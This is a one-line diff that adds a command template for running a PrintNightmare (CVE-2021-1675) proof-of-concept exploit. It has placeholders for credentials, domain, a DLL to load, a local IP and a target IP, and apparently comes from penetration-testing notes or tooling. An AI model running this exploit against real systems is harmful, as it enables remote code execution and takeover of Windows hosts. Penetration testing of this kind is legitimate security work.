@@ -1,0 +1,1 @@
+poc_printnightmare_cve20211675 -v -u $USERNAME -p $PASSWORD -d $DOMAIN -dll $NAME_DLL.dll --local-ip $MY_IP $TARGET_IP
